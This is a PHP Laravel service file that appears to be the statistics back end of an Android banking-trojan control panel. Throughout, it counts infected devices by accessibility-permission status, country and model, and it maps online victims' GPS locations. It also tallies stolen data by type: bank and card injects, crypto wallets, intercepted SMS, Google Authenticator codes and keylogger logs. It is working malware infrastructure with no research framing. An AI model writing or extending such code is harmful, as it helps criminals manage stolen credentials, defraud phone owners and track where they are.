<?php

namespace App\Services;

use App\Dictionary\CountryDictionary;
use App\Models\Bot;
use App\Models\BotLog;
use App\Models\User;
use Carbon\Carbon;
use Illuminate\Database\Eloquent\Builder;
use Illuminate\Database\Query\Builder as QueryBuilder;
use Illuminate\Support\Facades\DB;

class StatsService
{
    protected static function getBotsQuery(): Builder
    {
        /** @var User $user */
        $user = auth()->user();

        return Bot::when(count($user->tags), function ($query) use ($user) {
            return $query->whereIn('tag', $user->tagsNames);
        });
    }

    protected static function getBotLogsQuery(): Builder
    {
        /** @var User $user */
        $user = auth()->user();

        return BotLog::join('bots', 'bot_logs.bot_id', '=', 'bots.id')
            ->when(count($user->tags), function ($query) use ($user) {
                return $query->whereIn('bots.tag', $user->tagsNames);
            });
    }

    protected static function getBotLogsTimelinesQuery(string $from = NULL, string $to = NULL): QueryBuilder
    {
        /** @var User $user */
        $user = auth()->user();

        return DB::table('bot_logs')
            ->selectRaw("date_format(bot_logs.created_at, '%Y-%m-%d') as date, COUNT(*) as count, type as category")
            ->groupByRaw("YEAR(bot_logs.created_at), MONTH(bot_logs.created_at), DAY(bot_logs.created_at)")
            ->join('bots', 'bot_logs.bot_id', '=', 'bots.id')
            ->when(count($user->tags), function ($query) use ($user) {
                return $query->whereIn('bots.tag', $user->tagsNames);
            })
            ->when($from, function ($query) use ($from) {
                $query->whereRaw("date_format(bot_logs.created_at, '%Y-%m-%d') >= ?", [$from]);
            })
            ->when($to, function ($query) use ($to) {
                $query->whereRaw("date_format(bot_logs.created_at, '%Y-%m-%d') <= ?", [$to]);
            });
    }

    protected static function getBotsCounts(): array
    {
        $botsQuery = self::getBotsQuery();

        $botsUninstalled = (clone $botsQuery)->whereRaw('last_connection < DATE_SUB(NOW() , INTERVAL 2400 MINUTE)')
            ->whereRaw('JSON_EXTRACT(sub_info, "$.accessibility") = "true"')
            ->count();

        $botsPermissionless = (clone $botsQuery)->whereRaw('JSON_EXTRACT(sub_info, "$.accessibility") = "false"')
            ->count();

        $botsLastHour = (clone $botsQuery)->whereRaw('created_at >= DATE_SUB(NOW() , INTERVAL 60 MINUTE)')
            ->whereRaw('JSON_EXTRACT(sub_info, "$.accessibility") = "true"')
            ->count();

        $botsLastDay = (clone $botsQuery)->whereRaw('created_at >= DATE_SUB(NOW() , INTERVAL 60*24 MINUTE)')
            ->whereRaw('JSON_EXTRACT(sub_info, "$.accessibility") = "true"')
            ->count();

        $botsLastWeek = (clone $botsQuery)->whereRaw('created_at >= DATE_SUB(NOW() , INTERVAL 60*24*7 MINUTE)')
            ->whereRaw('JSON_EXTRACT(sub_info, "$.accessibility") = "true"')
            ->count();

        $botsLastMonth = (clone $botsQuery)->whereRaw('created_at >= DATE_SUB(NOW() , INTERVAL 60*24*30 MINUTE)')
            ->whereRaw('JSON_EXTRACT(sub_info, "$.accessibility") = "true"')
            ->count();

        return [
            'total' => (clone $botsQuery)->count(),
            'uninstalled' => $botsUninstalled,
            'permissionless' => $botsPermissionless,
            'lastHour' => $botsLastHour,
            'lastDay' => $botsLastDay,
            'lastWeek' => $botsLastWeek,
            'lastMonth' => $botsLastMonth,
        ];
    }

    protected static function getInjectLogsCounts(): array
    {
        $botLogsQuery = self::getBotLogsQuery();

        return [
            'banks' => (clone $botLogsQuery)->where('type', 'banks')->count(),
            'credit_cards' => (clone $botLogsQuery)->where('type', 'credit_cards')->count(),
            'stealers' => (clone $botLogsQuery)->where('type', 'stealers')->count(),
            'crypt' => (clone $botLogsQuery)->where('type', 'crypt')->count(),
            'shops' => (clone $botLogsQuery)->where('type', 'shops')->count(),
            'emails' => (clone $botLogsQuery)->where('type', 'emails')->count(),
            'wallets' => (clone $botLogsQuery)->where('type', 'wallets')->count(),
        ];
    }

    protected static function getLogsCounts(): array
    {
        $botLogsQuery = self::getBotLogsQuery();

        return [
            'smslist' => (clone $botLogsQuery)->where('type', 'smslist')->count(),
            'hidesms' => (clone $botLogsQuery)->where('type', 'hidesms')->count(),
            'googleauth' => (clone $botLogsQuery)->where('type', 'googleauth')->count(),
            'otheraccounts' => (clone $botLogsQuery)->where('type', 'otheraccounts')->count(),
            // 'pushlist' => (clone $botLogsQuery)->where('type', 'pushlist')->count(),
            // 'keylogger' => (clone $botLogsQuery)->where('type', 'keylogger')->count(),
        ];
    }

    protected static function getInjectLogsTimelines(string $from = NULL, string $to = NULL): array
    {
        $botLogsTimelinesQuery = self::getBotLogsTimelinesQuery($from, $to);

        $banksTimelines = (clone $botLogsTimelinesQuery)
            ->where('type', '=', 'banks')
            ->get()
            ->toArray();

        $creditCardsTimelines = (clone $botLogsTimelinesQuery)
            ->where('type', '=', 'credit_cards')
            ->get()
            ->toArray();

        $stealersTimelines = (clone $botLogsTimelinesQuery)
            ->where('type', '=', 'stealers')
            ->get()
            ->toArray();

        $cryptTimelines = (clone $botLogsTimelinesQuery)
            ->where('type', '=', 'crypt')
            ->get()
            ->toArray();

        $shopsTimelines = (clone $botLogsTimelinesQuery)
            ->where('type', '=', 'shops')
            ->get()
            ->toArray();

        $emailsTimelines = (clone $botLogsTimelinesQuery)
            ->where('type', '=', 'emails')
            ->get()
            ->toArray();

        $walletsTimelines = (clone $botLogsTimelinesQuery)
            ->where('type', '=', 'wallets')
            ->get()
            ->toArray();

        $injectTimelines = array_merge(
            $banksTimelines,
            $creditCardsTimelines,
            $stealersTimelines,
            $cryptTimelines,
            $shopsTimelines,
            $emailsTimelines,
            $walletsTimelines
        );

        return collect($injectTimelines)->sortBy(function ($log) {
            return $log->date;
        })->values()->toArray();
    }

    protected static function getLogsTimelines(string $from = NULL, string $to = NULL): array
    {
        $botLogsTimelinesQuery = self::getBotLogsTimelinesQuery($from, $to);

        $smsListTimelines = (clone $botLogsTimelinesQuery)
            ->where('type', '=', 'smslist')
            ->get()
            ->toArray();

        $hideSMSListTimelines = (clone $botLogsTimelinesQuery)
            ->where('type', '=', 'hidesms')
            ->get()
            ->toArray();

        $googleAuthTimelines = (clone $botLogsTimelinesQuery)
            ->where('type', '=', 'googleauth')
            ->get()
            ->toArray();

        $otherAccountsTimelines = (clone $botLogsTimelinesQuery)
            ->where('type', '=', 'otheraccounts')
            ->get()
            ->toArray();

        $pushListTimelines = (clone $botLogsTimelinesQuery)
            ->where('type', '=', 'pushlist')
            ->get()
            ->toArray();

        $keyloggerTimelines = (clone $botLogsTimelinesQuery)
            ->where('type', '=', 'keylogger')
            ->get()
            ->toArray();

        $logsTimelines = array_merge(
            $smsListTimelines,
            $hideSMSListTimelines,
            $googleAuthTimelines,
            $otherAccountsTimelines,
            $pushListTimelines,
            $keyloggerTimelines,
        );

        return collect($logsTimelines)->sortBy(function ($log) {
            return $log->date;
        })->values()->toArray();
    }

    protected static function getBotsTimelines(string $from = NULL, string $to = NULL): array
    {
        $botsQuery = self::getBotsQuery();

        return (clone $botsQuery)
            ->selectRaw("date_format(created_at, '%Y-%m-%d') as date, COUNT(*) as count")
            ->groupByRaw("YEAR(created_at), MONTH(created_at), DAY(created_at)")
            ->when($from, function ($query) use ($from) {
                $query->whereRaw("date_format(created_at, '%Y-%m-%d') >= ?", [$from]);
            })
            ->when($to, function ($query) use ($to) {
                $query->whereRaw("date_format(created_at, '%Y-%m-%d') <= ?", [$to]);
            })
            ->orderBy("date")
            ->get()
            ->toArray();
    }

    protected static function getBotsCountries(int $botsTotal): array
    {
        return (clone self::getBotsQuery())
            ->selectRaw('COUNT(*) as count, country_code')
            ->groupBy('country_code')
            ->orderByDesc('count')
            ->get()
            ->map(function (Bot $bot) use ($botsTotal) {
                return [
                    'count' => $bot->count,
                    'percent' => round($bot->count / $botsTotal * 100),
                    'country_code' => $bot->country_code,
                    'country' => CountryDictionary::COUNTRIES[strtoupper($bot->country_code)] ?? "RU",
                ];
            })->toArray();
    }

    protected static function getBotsModels(): array
    {
        $botsQuery = self::getBotsQuery();

        $botModels = (clone $botsQuery)
            ->selectRaw("JSON_EXTRACT(metadata, '$.device') as device, COUNT(*) as count")
            ->whereRaw("JSON_EXTRACT(metadata, '$.device') IS NOT NULL")
            ->groupBy('device')
            ->orderByDesc('count')
            ->get()
            ->map(function (Bot $bot) {
                $device = str_replace('"', "", $bot->device);
                return [
                    'device' => $device,
                    'count' => $bot->count,
                ];
            });

        return $botModels->toArray();
    }

    protected static function getBotsAndroids(): array
    {
        $botsQuery = self::getBotsQuery();

        $botModels = (clone $botsQuery)
            ->selectRaw("JSON_EXTRACT(metadata, '$.version') as version, COUNT(*) as count")
            ->whereRaw("JSON_EXTRACT(metadata, '$.version') IS NOT NULL")
            ->groupBy('version')
            ->orderBy('count')
            ->get();

        return $botModels->toArray();
    }

    protected static function getOnlineBotsOnMap(): array
    {
        return (clone self::getBotsQuery())
            ->whereRaw('last_connection >= DATE_SUB(NOW() , INTERVAL 1 MINUTE)')
            ->whereRaw('JSON_EXTRACT(sub_info, "$.accessibility") = "true"')
            ->whereRaw("location IS NOT NULL")
            ->whereRaw("JSON_EXTRACT(location, '$.lat') IS NOT NULL")
            ->whereRaw("JSON_EXTRACT(location, '$.lon') IS NOT NULL")
            ->get()
            ->mapWithKeys(function (Bot $bot) {
                return [$bot->id => $bot->location];
            })
            ->toArray();
    }

    private static function getShortStats(): array
    {
        $botsQuery = self::getBotsQuery();

        $botsTotalToday = (clone $botsQuery)->whereDate('created_at', Carbon::today())->count();

        $botsOnline = (clone $botsQuery)->whereRaw('last_connection >= DATE_SUB(NOW() , INTERVAL 1 MINUTE)')
            ->whereRaw('JSON_EXTRACT(sub_info, "$.accessibility") = "true"')
            ->count();

        $botsOffline = (clone $botsQuery)->whereRaw('last_connection >= DATE_SUB(NOW() , INTERVAL 2400 MINUTE)')
            ->whereRaw('JSON_EXTRACT(sub_info, "$.accessibility") = "true"')
            ->whereRaw('last_connection < DATE_SUB(NOW() , INTERVAL 1 MINUTE)')
            ->count();

        return [
            'bots' => [
                'counts' => [
                    'totalToday' => $botsTotalToday,
                    'online' => $botsOnline,
                    'offline' => $botsOffline,
                ],
            ],
        ];
    }

    private static function getFullStats(string $from = NULL, string $to = NULL): array
    {
        $botsCounts = self::getBotsCounts();

        return array_merge_recursive(self::getShortStats(), [
            'bots' => [
                'counts' => $botsCounts,
                'timelines' => self::getBotsTimelines($from, $to),
                'countries' => self::getBotsCountries($botsCounts['total']),
                'models' => self::getBotsModels(),
                'androids' => self::getBotsAndroids(),
                'map' => self::getOnlineBotsOnMap(),
            ],
            'logs' => [
                'counts' => self::getLogsCounts(),
                'timelines' => [], //self::getLogsTimelines($from, $to),
            ],
            'injects' => [
                'counts' => self::getInjectLogsCounts(),
                'timelines' => self::getInjectLogsTimelines($from, $to),
            ],
        ]);
    }

    public static function getStats(bool $isShort, string $from = NULL, string $to = NULL): array
    {
        if ($isShort) {
            return self::getShortStats();
        }

        return self::getFullStats($from, $to);
    }
}
